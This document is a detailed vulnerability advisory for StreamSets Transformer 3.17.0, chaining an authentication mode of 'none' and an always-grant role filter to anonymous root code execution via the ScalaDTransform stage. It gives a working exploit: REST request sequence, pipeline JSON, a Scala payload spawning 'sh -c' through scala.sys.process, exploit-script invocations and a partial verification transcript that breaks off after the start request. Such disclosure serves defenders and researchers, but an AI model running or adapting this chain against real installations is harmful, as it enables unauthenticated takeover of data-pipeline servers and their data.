# StreamSets Transformer 3.17.0 — "none" Authentication Mode Fallback and Un-sandboxed ScalaDTransform Code Execution → Anonymous Root RCE

## 1. Overview

### Overview of the product and the deployment under test

StreamSets Transformer 3.17.0 is a closed-source commercial data-pipeline and ETL platform from StreamSets Inc., a company subsequently acquired by IBM. Unlike its sibling product StreamSets Data Collector, which drives its own proprietary SDC runtime, Transformer executes pipelines as **Apache Spark** jobs: the pipeline authored in the web UI is compiled into a Spark dataflow, and its processors operate on `Dataset<Row>` objects rather than on SDC records. The build examined here is **Transformer 3.17.0**, analysed from the official container image `streamsets/transformer:3.17.0`.

The runtime stack recorded during the audit is **Java 8**, **Jetty 9.4.22** as the embedded servlet container, **Jersey** for the JAX-RS REST layer, **Guice** for dependency injection, and **Spark with Scala 2.11** for the execution engine. Configuration lives in `/etc/transformer/`, which holds `transformer.properties` (web tier, ports, authentication) and `dpm.properties` (DPM registration). In the container deployment the service listens on HTTP port **19630** and the container process runs as **root, uid=0** — established during dynamic verification by executing `id` inside the container, not assumed.

All source-level statements in this advisory rest on **CFR-decompiled classes** taken from the distributed image, not on vendor-supplied source. The decompiled tree covered two areas: the Spark stage library containing `com/streamsets/pipeline/spark/transform/scala/`, and the web tier containing `com/streamsets/datacollector/http/`. Class names, field names, method names and line numbers cited below are those of the decompiler output.

What the finding is, in one sentence: **when the effective value of the `http.authentication` property resolves to `none`, Transformer installs no authentication handler at all and simultaneously registers a servlet filter that makes every role check pass, and the REST pipeline API then accepts an attacker-chosen pipeline containing a `ScalaDTransform` stage whose free-text `code` field is compiled by the full Scala compiler and executed inside the container JVM as uid 0 — which is anonymous remote code execution as root.**

There are therefore two independent defects, and both are needed for the chain as demonstrated:

- **An insecure fallback and an over-broad authorisation filter** in the web tier. `WebServerTask` declares `AUTHENTICATION_DEFAULT = "none"`, and `createSecurityHandler()` returns `null` for that mode, so Jetty performs no authentication. `WebServerModule.provideNoAuthenticationRoles` then registers `AlwaysAllRolesFilter` on `/*` whenever the mode is `none` *and* DPM is disabled; that filter wraps the request so `isUserInRole(...)` returns `true` unconditionally and `getUserPrincipal()` returns a principal named `admin`. Every `@RolesAllowed` annotation is satisfied by an anonymous caller.
- **An un-sandboxed code-execution stage** in the Spark stage library. `ScalaDTransform` exposes a `code` configuration field of type `TEXT`, passed to `ScalaTransform`, compiled by `TransformScriptRunner` via `scala.tools.nsc.Global` and executed through `runner.run(dataFrames)`. The research record names exactly three absences on that path — no `SecurityManager`, no sandbox and no API allowlist — and this advisory relies on those three and on nothing further; it does not assert a recorded absence of any check applied to the emitted bytecode, of any limit on how the compiled class is loaded, or of compilation happening in a distinct lower-privilege process — none of those properties was examined. Positively, the record observes that the compiled Scala executes in the service's own JVM under the container's operating-system identity, and that `scala.sys.process` is reachable from it, so the compiled stage can spawn OS processes directly.

A statement of scope that must not be skipped. **`none` is not the value the official container image ships in its properties file.** The shipped `transformer.properties` sets `http.authentication=aster`; `none` is (a) a documented, operator-selectable value listed in the same file's own comment and (b) the hard-coded code-level fallback that takes effect when the property key is unreadable or absent. The instance used for dynamic verification was deliberately configured to `none` — the research record's own reproduction command passes that value to the container. This is a **configuration-dependent** finding with a genuinely insecure code-level default, not a claim that a freshly pulled image is anonymous out of the box. Section 3 sets out the artifact evidence and section 12 scores both readings: **8.1 High** as the primary, configuration-dependent score, and **9.8 Critical** as the conditional score that applies to deployments whose effective mode does resolve to `none`.

## 2. Vulnerability Summary

### Summary of the defect, its prerequisites and its result

- **Type**: missing authentication caused by an insecure code-level default combined with an always-succeed role filter (CWE-306 / CWE-1188 / CWE-285), reaching an un-sandboxed code-injection sink that compiles and runs attacker-supplied Scala source (CWE-94), yielding remote command execution as the container's operating-system identity.
- **Vendor / product / version**: StreamSets Inc. (now IBM), StreamSets Transformer, **3.17.0** verified. Other 3.x versions sharing the same `WebServerTask` fallback and the same `ScalaDTransform` stage are likely affected but were not enumerated or tested in this research.
- **CWE list recorded by the research**: CWE-306 (Missing Authentication for Critical Function) and CWE-94 (Improper Control of Generation of Code). This advisory adds CWE-1188, CWE-285 and CWE-250 as its own derivation from that same evidence; see section 12.
- **Primary CVSS 3.1 score**: 8.1 High — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Conditional CVSS 3.1 score**: 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Entry point**: HTTP REST under `/rest/v1/` on port 19630 — `PUT /rest/v1/pipeline/{title}?autoGeneratePipelineId=true`, `GET /rest/v1/pipeline/{id}`, `POST /rest/v1/pipeline/{id}?rev=0`, `POST /rest/v1/pipeline/{id}/start`, `GET /rest/v1/pipeline/{id}/status`.
- **Sink**: `ScalaTransform` constructed from `ScalaDTransform.getOperator()`, compiled by `TransformScriptRunner` using `scala.tools.nsc.Global`, executed by `runner.run(dataFrames)`.
- **Attacker-controlled data**: the `code` entry inside `stages[].configuration[]` of the pipeline JSON submitted to the save endpoint — a `ConfigDef.Type.TEXT` field that is delivered verbatim to the Scala compiler.
- **Precondition**: the effective value of `http.authentication` must resolve to `none`, and DPM must be disabled (`dpm.enabled=false`, which is the recorded default of `dpm.properties`). The container image's own properties file sets `aster`, so reaching the `none` state requires either an explicit operator choice or the loss or overriding of that property.
- **Result**: the submitted Scala source is compiled and executed inside the Transformer JVM. The container runs as uid 0, so `scala.sys.process` invocations execute as root; no privilege-escalation step is involved.
- **Verification status**: dynamically verified end-to-end over the REST interface against a live instance of the official container image, three independent runs, each leaving a uniquely named marker file owned by `root:root` inside the container. Command output was recovered out of band by container access, not returned over HTTP.
- **Authentication required in the verified configuration**: none. No `Authorization` header, no cookie, no DPM token. The only header the API demands is `X-Requested-By: SDC`, a CSRF-protection header required by Jersey's `CsrfProtectionFilter` — a fixed constant, not a credential.

## 3. Authentication Boundary

### Authentication boundary: two gates, and how one configuration value opens both

Transformer's web tier has two distinct enforcement points, and the `none` mode disables both of them independently.

**Gate one — Jetty authentication.** `WebServerTask` selects a `SecurityHandler` from the configured mode. The relevant decompiled code is:

```java
// WebServerTask.java:133
public static final String AUTHENTICATION_DEFAULT = "none";

// WebServerTask.java:144
public static final ImmutableSet<String> AUTHENTICATION_MODES =
    ImmutableSet.of("none", "digest", "basic", "form");

// WebServerTask.java:337-371
private SecurityHandler createSecurityHandler() {
    String auth = conf.get(AUTHENTICATION_KEY, "none");   // fallback literal is "none"
    SecurityHandler securityHandler = null;
    switch (auth) {
        case "none":
            securityHandler = null;                       // no authentication at all
            break;
        case "basic":
            securityHandler = new BasicAuthHandler(...);
            break;
        // ... remaining modes
    }
    return securityHandler;
}
```

Two things deserve emphasis. First, the default parameter of `conf.get(AUTHENTICATION_KEY, "none")` is a **string literal**, and the class publishes it as the constant `AUTHENTICATION_DEFAULT`. If the configuration subsystem cannot resolve the key — the properties file is absent, trimmed, unreadable, overridden by an environment value, or simply never carried the key — the value that reaches the switch is `none`. Second, the `case "none"` branch assigns `null`. That is not a permissive handler with a weak realm; it is the **absence** of a handler, so Jetty never challenges a request and every servlet behind it executes anonymously.

The research record enumerated the `none` and `basic` branches from the decompilation and did not transcribe the remaining branches beyond noting that `aster` is the mode the shipped property file selects. No claim is made here about the internals of the `aster`, `digest` or `form` branches.

**Gate two — role authorisation.** Even with no authentication handler, Jersey resource methods annotated `@RolesAllowed` would still be evaluated against the request's roles. Transformer removes that protection too, in the Guice module that configures the embedded servlet context:

```java
// WebServerModule.java:217-228
@Provides(type = Provides.Type.SET)
ContextConfigurator provideNoAuthenticationRoles(
        final Configuration configuration, final RuntimeInfo runtimeInfo) {
    return new ContextConfigurator() {
        public void init(ServletContextHandler context2) {
            if (configuration.get("http.authentication", "none").equals("none")
                    && !runtimeInfo.isDPMEnabled()) {
                FilterHolder filter2 = new FilterHolder(new AlwaysAllRolesFilter());
                context2.addFilter(filter2, "/*", EnumSet.of(DispatcherType.REQUEST));
            }
        }
    };
}
```

The condition is a conjunction of two states, both of which are the recorded defaults of the configuration subsystem as consulted here: the mode reads `none` (again with the `"none"` string literal as the fallback argument), and `runtimeInfo.isDPMEnabled()` is false. `dpm.properties` ships `dpm.enabled=false`, so the second half of the conjunction holds out of the box.

The filter that gets registered on `/*` is what makes every authorisation check pass:

```java
// AlwaysAllRolesFilter.java
public class AlwaysAllRolesFilter implements Filter {
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
        HttpServletRequest wrapped = new HttpServletRequestWrapper((HttpServletRequest) request) {
            @Override
            public boolean isUserInRole(String role) {
                return true;                      // any role is granted
            }
            @Override
            public Principal getUserPrincipal() {
                return new UserPrincipal("admin"); // caller is presented as "admin"
            }
        };
        chain.doFilter(wrapped, response);
    }
}
```

So an anonymous request reaching `PipelineResource` is wrapped, reports membership in every role, and identifies itself as the user `admin`. Annotation-driven authorisation cannot fail. The research record describes this as a **double-gate failure**: the authentication gate returns `null`, and the authorisation gate is satisfied by a filter that always answers yes.

### Authentication boundary artifact evidence: is `none` the shipped default?

This is the question that decides how the finding must be classified, and the research record contains an artifact that answers it directly.

The distributed container image carries a populated configuration file. Quoting the recorded contents of `/etc/transformer/transformer.properties`:

```properties
# /etc/transformer/transformer.properties (shipped in streamsets/transformer:3.17.0)
# line 83:  # Valid values are: 'none', 'basic', 'digest', 'form' or 'aster'
# line 85:  http.authentication=aster
```

The artifact therefore establishes three separate facts, and they must be kept apart:

1. **The shipped property value is `aster`, not `none`.** A container started from the official image without intervention reads `http.authentication=aster`. In that state `createSecurityHandler()` does not take the `case "none"` branch, and `provideNoAuthenticationRoles` does not register `AlwaysAllRolesFilter`, because its condition tests for `equals("none")`. The research record notes that `aster` mode requires DPM registration and in practice blocks first use until the instance is registered. **A stock image is not anonymous.**
2. **`none` is a documented, supported value.** Line 83 of the same shipped file lists it first among the valid values. Selecting it is not a hack, a bypass or an unsupported edit — it is configuration that the vendor's own file invites the operator to choose.
3. **`none` is the code-level fallback.** `WebServerTask.AUTHENTICATION_DEFAULT` and both `configuration.get(..., "none")` call sites use `none` as the value applied when the key cannot be resolved. The product therefore fails **open**, not closed: losing the property yields an unauthenticated, all-roles-granting web tier rather than a refused startup.

The dynamic verification was performed against an instance deliberately placed in the `none` state. The research record's own reproduction command shows this explicitly:

```bash
docker run -d --name transformer -p 127.0.0.1:19630:19630 \
  -e http_authentication=none streamsets/transformer:3.17.0
# (or set http.authentication=none in /etc/transformer/transformer.properties and restart)
```

### Authentication boundary conclusion: how this finding must be classified

**`none` is not the shipped default of the distribution artifact.** It is a documented operator-selectable value and the hard-coded fallback the code applies when the property is unresolvable. The tested instance was configured that way by the researcher.

The honest classification is therefore **configuration-dependent**, and the advisory says so in both section 3 and section 12 rather than presenting a factory-default anonymous compromise. Three concrete states reach the vulnerable condition, and all three are real rather than hypothetical:

- an operator sets `http.authentication=none` — for example to evaluate the product, to run it behind a trusted proxy, or because a deployment guide for an air-gapped lab did so;
- the property is lost, so the code fallback applies — a trimmed or replaced `transformer.properties`, a mounted configuration volume that does not carry the key, or a packaging change that drops the line;
- an operator sets it deliberately to bypass DPM registration, since `aster` requires DPM enrolment.

What none of those states requires is attacker action. That is precisely why the score is expressed as `PR:N` with `AC:H` in the primary reading — the attacker needs no privilege, but success depends on a target state the attacker does not control — and as `PR:N` with `AC:L` in the conditional reading, which applies to the population of deployments actually sitting in the `none` state. Note also that this is **not** a self-invented misconfiguration of the kind where the researcher disables a security control to create a vulnerability: `none` is a supported value the product itself documents and defaults to in code. The weakness is that the product's failure mode is open rather than closed, and that the open mode additionally synthesises an `admin` principal and grants every role.

## 4. Attack Surface

### Attack surface: the REST pipeline API and the stage library behind it

The exposed surface in the verified deployment is a single plain-HTTP listener. There is no reverse proxy, no WAF and no mutual-TLS layer in front of it in the recorded deployment; the container publishes port **19630** and, in the verification run, that publication was bound to the loopback interface of the lab host. Nothing in the record indicates the product requires or provides any additional network-level gate.

| Layer | Recorded components |
|---|---|
| Transport | HTTP on port 19630, Jetty 9.4.22 embedded servlet container |
| REST framework | Jersey (JAX-RS), resource classes under `/rest/v1/`; `CsrfProtectionFilter` enforces the `X-Requested-By` header |
| Injection / DI | Guice; `WebServerModule` contributes the `ContextConfigurator` set that installs `AlwaysAllRolesFilter` |
| Authentication | `WebServerTask.createSecurityHandler()` — `null` when the mode is `none` |
| Authorisation | JAX-RS `@RolesAllowed` on resource methods, satisfied by `AlwaysAllRolesFilter.isUserInRole()` returning `true` |
| Pipeline store | pipeline configuration objects holding `stages`, `paths`, `configuration`; fetched and resaved verbatim over REST |
| Execution engine | Spark; `executionMode` is a pipeline-level `configuration` entry with `BATCH` used in verification |
| Stage library | `streamsets-spark-basic-lib`, supplying origins, processors and destinations including `ScalaDTransform` |
| DPM | `dpm.properties` with `dpm.enabled=false` recorded as the default; DPM disabled is a precondition for the all-roles filter |

The endpoints that make up the chain, all reachable without credentials in the `none` state:

```
PUT  /rest/v1/pipeline/{title}?autoGeneratePipelineId=true   -> 201, body carries "pipelineId"
GET  /rest/v1/pipeline/{id}                                  -> 200, empty pipeline JSON (stages=0)
POST /rest/v1/pipeline/{id}?rev=0                            -> 200, accepts the attacker stage list
POST /rest/v1/pipeline/{id}/start                            -> 200, starts the Spark run
GET  /rest/v1/pipeline/{id}/status                           -> 200, STARTING -> RUNNING -> FINISHED
GET  /rest/v1/pipelines                                      -> 200, lists existing pipelines anonymously
```

Two surface details matter for exploit construction and are recorded as hard-won constraints rather than as guesses:

- **`X-Requested-By: SDC` is mandatory but is not a credential.** Jersey's `CsrfProtectionFilter` rejects requests lacking it. The value is a fixed constant and is required of every client, including the browser UI. Every request in the proof of concept sends it; none send anything resembling authentication.
- **The stage library and stage names are addressable strings.** The Spark stage library is named `streamsets-spark-basic-lib`, and stages are referenced by underscore-mangled class names such as `com_streamsets_pipeline_spark_transform_scala_ScalaDTransform` with an explicit `stageVersion`. The server fills in unspecified configuration defaults itself — the recorded technique for the `RawDataDOrigin` source is to send an empty `configuration` array and let the server populate the nested `conf.*` fields, including a default `rawData` payload of valid JSON.
- **`executionMode` must be a Spark-compatible value.** `STANDALONE` does not support the Spark stage family; `BATCH` was used and does not pull in `badRecordsHandling` dependencies. `STREAMING` is accepted by the tooling exposed here but was not exercised during verification.
- **`NullDTarget` versus `ToErrorNullDTarget`.** The main-canvas destination is `com_streamsets_pipeline_spark_destination_dev_NullDTarget`; the error-only variant carries a different mangled name and is not what the chain uses.

## 5. Sink Identification

### Sink identification: the `code` field of `ScalaDTransform` is delivered to a full Scala compiler

The Spark stage library ships a processor whose entire purpose is to evaluate operator-supplied Scala. Its decompiled declaration shows the configuration field, its declared type and the operator factory that consumes it:

```java
// ScalaDTransform.java   (com/streamsets/pipeline/spark/transform/scala/)
@ConfigDef(
    type = ConfigDef.Type.TEXT,
    mode = ConfigDef.Mode.SCALA       // Scala source, compiled and executed
)
public String code;

@ConfigDef
public boolean skipEmptyBatches;

@Override
public SparkTransform getOperator() {
    return new ScalaTransform(this.code, this.skipEmptyBatches);
}
```

Three properties of this declaration make it a sink rather than merely a data field. `ConfigDef.Type.TEXT` means the field is an unconstrained string — there is no enumerated value set, no pattern, no length bound and no reference to a pre-existing script object. `ConfigDef.Mode.SCALA` — and the characterisation that follows is **this advisory's inference, not a statement in the research record**, which preserves the annotation and its accompanying comment and nothing more: on that evidence the annotation reads as an editor hint telling the UI to render a Scala code pane, and nothing in the decompiled path examined here turns it into a validator. `getOperator()` passes the string straight into the operator's constructor.

The operator itself is where compilation and execution happen:

```java
// ScalaTransform.java
public class ScalaTransform extends SparkTransform {
    private final String code;
    private final boolean skipEmptyBatches;
    private TransformScriptRunner runner;

    public void init(...) throws StageException {
        this.runner = ScalaRunnerHelper.createRunner(this.code, ...);   // code -> compiled
        ...
    }

    public Map<String, Buffer<Dataset<Row>>> transform(...) {
        // inputs -> Buffer<Dataset<Row>>
        if (allEmpty && skipEmptyBatches) { return outputs; }
        this.runner().run(dataFrames);                                  // executes the compiled Scala
        ...
    }
}
```

`init()` is called once when the Spark stage is materialised for a run, and it is `init()` that turns the attacker's string into executable code; `transform()` then invokes the result on every batch. The compilation backend is recorded as the **full Scala compiler**: `TransformScriptRunner` uses `scala.tools.nsc.Global`, which is the front end of `scalac` embedded as a library. It parses, type-checks and emits JVM bytecode for the submitted source, and the resulting class is loaded and invoked inside the same JVM. There is no intermediate representation, no expression language and no restricted evaluator.

### Sink identification: sandbox, process and operating-system identity

Addressing the two questions a reader must be able to answer before trusting the severity claim.

**Is there a sandbox, and was one bypassed?** The recorded answer is stronger and simpler than a bypass: **there is no sandbox present in this path.** The research record names exactly three absences here — no `SecurityManager`, no sandbox and no API allowlist — and this advisory rests on those three and on nothing beyond them. It specifically does **not** assert a recorded absence of any check applied to the emitted bytecode, of any limit on how the compiled class is loaded, or of compilation happening in a distinct lower-privilege process or container: those properties were not examined and no evidence about them exists in the record. What the record does establish positively, rather than by absence, is that the Scala executes **in the service's own JVM** under that JVM's operating-system identity, and that the compiled code can call arbitrary Java and Scala APIs including `scala.sys.process`. So `scala.sys.process._` — the standard library's process-spawning package — is importable and usable, and calling `.!` on a `Seq[String]` forks `/bin/sh` through `ProcessBuilder`. Nothing had to be escaped. Framing this as a sandbox bypass would be inaccurate; the correct statement is that the product delegates all containment to the operating-system identity of its own process.

**Which JVM, which process, under which OS identity?** The stage is compiled and executed by the Transformer service's own JVM inside the `streamsets/transformer:3.17.0` container. That container process runs as **uid 0**, confirmed during verification in two independent ways: by reading the owner of the marker file the payload created (`root:root`), and by executing `id` inside the container, which returned `uid=0(root) gid=0(root)`. The chain therefore needs no local privilege-escalation step — a point worth contrasting with the sibling Data Collector product, where the service runs as the unprivileged `sdc` user (uid 20159) and a separate sudoers weakness is required to reach root. Here, root is the starting identity.

One boundary deserves an explicit note about what the evidence does and does not show. Transformer pipelines run as Spark jobs, and a Spark deployment can in principle distribute work to executors in other processes or on other hosts. The verification used `executionMode=BATCH` and the marker file appeared **inside the Transformer container**, which proves the compiled stage executed there under uid 0. Whether a different execution mode or an external Spark cluster configuration would relocate that execution elsewhere was **not** tested, and no claim about distributed execution is made here.

For completeness, the sink family is not accidental. Transformer is the Spark-engine sibling of Data Collector, and both provide an operator-authored code stage as a first-class feature — Scala for the Spark engine, shell for the SDC engine. A code-execution stage is intended functionality for a *trusted, authenticated* pipeline author. It becomes a vulnerability because of the web-tier defect in section 3: the trust that authorises the feature is manufactured by a filter rather than established by an authentication handler.

## 6. Source Identification

### Source identification: the pipeline JSON submitted to the save endpoint

The attacker-controlled input is the stage configuration inside a pipeline definition. The REST save endpoint accepts the whole pipeline object as a JSON request body, and each element of `stages[]` carries a `configuration` array of `{"name": ..., "value": ...}` pairs. For the Scala processor the pair that matters is:

```json
{
  "instanceName": "Scala_1",
  "library": "streamsets-spark-basic-lib",
  "stageName": "com_streamsets_pipeline_spark_transform_scala_ScalaDTransform",
  "stageVersion": "3",
  "configuration": [
    {"name": "code", "value": "<attacker Scala source>"},
    {"name": "skipEmptyBatches", "value": true}
  ],
  "uiInfo": {"stageType": "PROCESSOR", "label": "Scala"},
  "inputLanes": ["lanePOC1_<token>"],
  "outputLanes": ["lanePOC2_<token>"],
  "eventLanes": [],
  "services": []
}
```

The value bound to the `code` name is copied into `ScalaDTransform.code` and from there into `ScalaTransform`, `ScalaRunnerHelper.createRunner` and `scala.tools.nsc.Global`. Between the HTTP body and the compiler there is no sanitisation of any kind — no escaping, no keyword filtering, no import restriction, no size cap and no signature or approval check.

Everything else in the request is also attacker-chosen, and the set of controllable fields is worth enumerating because each was needed to make the server accept the pipeline:

- **The pipeline title**, carried in the `PUT` path segment, with `autoGeneratePipelineId=true` instructing the server to mint the `pipelineId`.
- **The full stage list**, including which library, which mangled stage name and which `stageVersion` — `2` for `RawDataDOrigin`, `3` for `ScalaDTransform`, `1` for `NullDTarget`.
- **The lane wiring**, via each stage's `inputLanes` / `outputLanes` and the pipeline-level `paths` array. The lanes used are arbitrary unique strings.
- **The source stage's configuration**, sent as an empty array so the server populates the nested `conf.*` defaults, including a default `rawData` value. This is a deliberate technique: supplying a partial nested bean caused validation failures, whereas supplying nothing lets the server fill in a self-consistent default that produces at least one record.
- **`executionMode`**, a pipeline-level `configuration` entry read from the server-supplied object and overwritten to `BATCH` before resaving.

At least one record must flow, because `ScalaTransform.transform()` short-circuits when every input buffer is empty and `skipEmptyBatches` is true. The default `rawData` of the Dev Raw Data origin supplies that record; setting `skipEmptyBatches` to `true` in the proof of concept is the source script's value and does not prevent execution here, since the input is non-empty.

### Source identification: what sanitisation exists and what it actually protects

Two server-side mechanisms sit on this path, and it is important not to overstate either.

`@RolesAllowed` annotations on the Jersey resource methods are the intended authorisation control. In the `none` state they are neutralised not by being absent but by being satisfied — `AlwaysAllRolesFilter` makes `isUserInRole` return `true` for every role name, and `getUserPrincipal()` return `admin`. The annotations still execute; they simply always pass.

`CsrfProtectionFilter` requires the `X-Requested-By` header. This is a cross-site-request-forgery defence, meaning it stops a browser from being tricked into issuing a state-changing request; it is not an authentication mechanism, its expected value `SDC` is a fixed public constant, and any non-browser client sets it in one line. It is the only header the proof of concept sends beyond `Content-Type`.

What genuinely constrains the request is **functional, not security-related**: the pipeline must validate as a runnable Spark dataflow. That is why the source is `RawDataDOrigin` with server-filled defaults, the destination is the main-canvas `NullDTarget` rather than `ToErrorNullDTarget`, and `executionMode` is `BATCH`. These constraints determine whether the pipeline starts; they perform no inspection of the Scala source itself.

## 7. Data Flow

### Data flow: five anonymous operations, ten HTTP requests in the recorded run, to compiled Scala running as uid 0

```
[attacker]  -- HTTP, no credentials, only "X-Requested-By: SDC" ---------+
                                                                           |
1) PUT /rest/v1/pipeline/{title}?autoGeneratePipelineId=true               |
     Jetty servlet container (Jetty 9.4.22)                                |
       securityHandler = null        <-- WebServerTask.createSecurityHandler()
                                         case "none" -> null  (WebServerTask.java:337-371)
       AlwaysAllRolesFilter on "/*"  <-- WebServerModule.provideNoAuthenticationRoles
                                         mode == "none" && !isDPMEnabled()
                                         (WebServerModule.java:217-228)
     Jersey CsrfProtectionFilter     -> X-Requested-By present, passes
     PipelineResource (@RolesAllowed)-> isUserInRole(any) == true, principal "admin", passes
     -> empty pipeline created -> HTTP 201, body {"pipelineId": "..."}

2) GET /rest/v1/pipeline/{id}
     -> HTTP 200, pipeline JSON with stages = [] , configuration[] incl. executionMode

3) POST /rest/v1/pipeline/{id}?rev=0        body = pipeline JSON
     stages[] += {stageName: com_streamsets_pipeline_spark_transform_scala_ScalaDTransform,
                  configuration: [{name:"code", value:<ATTACKER SCALA>},
                                  {name:"skipEmptyBatches", value:true}]}
     executionMode := "BATCH"
     -> same authN/authZ bypass as step 1 -> HTTP 200, configuration persisted

4) POST /rest/v1/pipeline/{id}/start
     -> same bypass -> HTTP 200
     -> Spark engine materialises the stage graph
        ScalaDTransform.getOperator() -> new ScalaTransform(code, skipEmptyBatches)
     -> ScalaTransform.init()
        ScalaRunnerHelper.createRunner(code, ...)
        TransformScriptRunner -> scala.tools.nsc.Global        <-- ATTACKER STRING COMPILED
        (recorded absences: no SecurityManager, no sandbox, no allowlist)
     -> ScalaTransform.transform(inputs)
        runner.run(dataFrames)                                  <-- COMPILED CODE EXECUTED
        inside the Transformer JVM, container uid = 0

5) GET /rest/v1/pipeline/{id}/status
     -> STARTING -> RUNNING -> FINISHED                          <-- execution observable

[inside the compiled Scala]
     import scala.sys.process._
     Seq("sh","-c", <cmd>).!   -> ProcessBuilder -> /bin/sh -> child of the uid 0 JVM
     (the PoC redirects stdout/stderr into /tmp/tf_rce_marker_<token> and appends POCOK)

[out of band]  docker exec <container> cat /tmp/tf_rce_marker_<token>
               -> uid=0(root) gid=0(root) groups=0(root),... + POCOK
```

Step 5 above is a poll, and the recorded third run polled six times, so the five operations correspond to **ten HTTP requests** in that run: one `PUT`, one `GET`, one `POST` to save, one `POST` to start, and six `GET` status polls. Every hop after the first is the same bypass repeated: the identical wrapped request object with an unconditional role grant. The hop that changes the security posture of the chain is not any of the HTTP calls but **step 4's `init()`**, which converts a persisted configuration string into loaded JVM bytecode. Up to that point the attacker has only written data into the product's own store; from that point the data has become code executing with the process's identity.

## 8. Exploit Construction

### Exploit construction: numbered steps from a bare URL to a root-owned marker

**Step 1 — confirm the boundary state before attacking.** An anonymous `GET /rest/v1/pipelines` is expected to distinguish the two states: HTTP 200 with a pipeline list means the effective mode is `none`. The other half of that test is **unobserved operator guidance rather than a recorded result** — only the `200` outcome was ever measured here, because every recorded request went to the instance configured to `none`, and section 9 records that no instance was exercised at its shipped property value, so no `401` or `403` from this product has been observed either. A `401` or `403` is what a Jetty security handler would be expected to return, and if one appears the chain does not apply. The proof of concept exposes this probe as `--mode probe`.

**Step 2 — create an empty pipeline.** `PUT /rest/v1/pipeline/{title}?autoGeneratePipelineId=true&description=poc` returns **201** with a JSON body containing `pipelineId`. The title is chosen to be unique per run so repeated testing does not collide.

**Step 3 — fetch the server's own pipeline skeleton.** `GET /rest/v1/pipeline/{id}` returns the full object with `stages` empty. Fetching rather than synthesising is what makes the exploit robust: the pipeline-level `configuration` array, including `executionMode`, arrives with every key the server expects, and the attacker only edits what is necessary.

**Step 4 — build the Scala payload.** The command must reach a shell as a single argument. The recorded pitfall is instructive: `scala.sys.process`'s `String.!!` form splits on whitespace and does **not** invoke a shell, so a command containing redirections or nested quotes produces `sh` syntax errors. The working form passes the command as one element of a `Seq` to `sh -c`:

```scala
import scala.sys.process._
Seq("sh","-c","id > /tmp/tf_rce_marker_<token> 2>&1; echo POCOK >> /tmp/tf_rce_marker_<token>").!
output = inputs(0)
```

Because the payload is embedded in a Scala string literal that is itself embedded in JSON, only `"` and `\` need escaping — the reference implementation does exactly `replace("\\","\\\\")` then `replace("\"","\\\"")`. The final line `output = inputs(0)` is required so the stage returns a valid dataset to its output lane and the pipeline completes normally rather than failing at the transform.

**Step 5 — assemble the three-stage graph and set the execution mode.** The submitted `stages` array is `RawDataDOrigin` (version `2`, empty `configuration` so the server fills the `conf.*` nested bean) → `ScalaDTransform` (version `3`, carrying the payload) → `NullDTarget` (version `1`, main-canvas target). `paths` wires `lane1 → lane2 → ""`, and the pipeline's `executionMode` entry is overwritten from its server default to `BATCH`, because `STANDALONE` does not support the Spark stage family and `BATCH` avoids pulling in `badRecordsHandling` dependencies.

**Step 6 — save and start.** `POST /rest/v1/pipeline/{id}?rev=0&description=poc` with the JSON body returns **200**. `POST /rest/v1/pipeline/{id}/start` with an empty body returns **200**.

**Step 7 — observe completion and read the marker out of band.** `GET /rest/v1/pipeline/{id}/status` is polled until it reports a terminal state; the recorded runs traversed `STARTING → RUNNING → FINISHED`. The command output is **not** returned over HTTP, so confirmation comes from the marker file inside the container — a per-run unique name carrying the command's stdout and stderr plus the `POCOK` sentinel line.

The shipped PoC, a parameterised re-implementation of the whole chain, is in this directory. It is **not** the client that produced the verification transcript in section 9 — the attribution is stated there explicitly:

```bash
python3 exploit/streamsets_transformer_auth_none_scaladtransform_rce.py \
        --host <lab-host> --port 19630 --mode probe

python3 exploit/streamsets_transformer_auth_none_scaladtransform_rce.py \
        --host <lab-host> --port 19630 \
        --command "id" --container transformer

python3 exploit/streamsets_transformer_auth_none_scaladtransform_rce.py \
        --host <lab-host> --mode render --command "whoami; hostname"
```

`--mode probe` performs only the anonymous reachability test; `--mode render` prints the exact Scala payload and stage JSON without sending anything, which is the safe way to review the construction; `--mode exploit` (the default) runs steps 2 through 7. Host, port, scheme, REST prefix, command, marker directory and prefix, pipeline title prefix, revision, execution mode, poll interval and poll count are all argparse parameters, and no lab address is embedded in the script. The script uses only the Python standard library.

### Exploit construction: reproduction of the verified environment

The deployment used for verification is reproducible from the official image, with the authentication mode set explicitly to the code-level fallback value:

```bash
docker run -d --name transformer -p 127.0.0.1:19630:19630 \
  -e http_authentication=none streamsets/transformer:3.17.0

python3 exploit/streamsets_transformer_auth_none_scaladtransform_rce.py \
  --host 127.0.0.1 --port 19630 --command id --container transformer

docker exec transformer cat /tmp/tf_rce_marker_<token>
```

The port publication is bound to the loopback interface here because the research was conducted on a shared host; the vulnerability itself is a property of the service and is not affected by which interface the container publishes on. A deployment publishing 19630 to a reachable network exposes exactly the same surface.

## 9. Dynamic Verification

### Dynamic verification: what was run, against what, over which interface

Verification was performed against a **live installation of the official container image**, not a model or an emulation of it. The target was `streamsets/transformer:3.17.0` running under Docker on a lab host, with the container's HTTP port published on the loopback interface as `127.0.0.1:19630`, and with the authentication mode explicitly set to the code-level fallback value `none` for this test. The container was confirmed to run as root. The interface exercised was plain **HTTP/1.1 against the Jersey REST API under `/rest/v1/`** — no TLS, no browser, no UI, no DPM connection, and no local shell access was used to reach the vulnerability itself. Local container access was used only afterwards, to read the out-of-band evidence.

The client that produced the recorded runs is the research-phase proof-of-concept script, a single Python file using only the standard library — **not** the parameterised re-implementation shipped in `exploit/`, which prints differently worded lines and did not produce the transcript below. It was run three separate times, each with a freshly generated unique token, so that every run's marker file name is distinct and stale evidence from an earlier run cannot be mistaken for a later one.

The recorded transcript of the third run. Three editorial changes are declared so that the reader knows exactly where this differs from the raw capture: the status and completion strings that the research-phase script printed in the researcher's locale are rendered in English; the internal research identifier is removed from the script's banner line, whose abbreviation is also expanded; and no other character is altered. Every status code, the pipeline id, the marker path, the poll sequence and the terminal state are verbatim from the run:

```
============================================================
StreamSets Transformer ScalaDTransform unauthenticated root RCE
============================================================
[*] Target: http://127.0.0.1:19630
[*] Auth: NONE (http.authentication=none, code-level default)
[*] Cmd: id
[*] Marker: /tmp/tf_rce_marker_<token-3>
[*] PUT create pipeline: 201
[+] pipelineId: tfpocc14f47d01df6-d443-486f-89bf-af400e3b2b10
[*] GET pipeline: OK, stages=0
[*] POST save: 200
[*] POST start: 200
